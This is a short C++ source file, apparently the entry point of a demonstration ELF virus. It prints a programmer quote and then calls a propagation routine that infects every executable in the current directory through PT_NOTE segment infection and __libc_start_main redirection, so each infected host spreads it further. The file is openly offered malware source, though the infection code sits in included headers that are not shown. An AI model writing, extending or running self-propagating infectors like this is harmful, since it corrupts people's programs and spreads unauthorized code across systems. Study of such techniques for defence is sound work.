#include <cstddef>
#include "common/directory_iterator.hh"
#include "common/macros.hh"
#include "infector/pt_note_infector.hh"
#include "propagation/propagate.hh"
#include "redirection/libc_start_main.hh"

// An example self propagating virus that is able to copies itself into all
// binaries within the current directory using the pt_note infection algorithm
// and entry point redirection. When any infected host is run, it spreads
// itself like a virus where permission allows.
int main() {
  const char* quote1 = STR_LITERAL(
      "If debugging is the process of removing software bugs, then programming "
      "must be the process of putting them in. - Edsger Dijkstra\n");
  const char* quote2 = STR_LITERAL(
      "If carpenters made buildings the way programmers make programs, the "
      "first woodpecker to come along would destroy all of civilization. - "
      "Unknown programmer\n");

  auto addr =
      reinterpret_cast<uintptr_t>(vf::common::get_parasite_start_address());
  const char* str = (addr & 0x100000) ? quote1 : quote2;

  vf::write(1, str, vf::strlen(str));

  // Propagate myself (virus) into all executables in the current directory.
  vf::propagation::propagate<vf::common::DirectoryIterator,
                             vf::infector::PtNoteInfector,
                             vf::redirection::LibcStartMainPatcher>();

  return 0;
}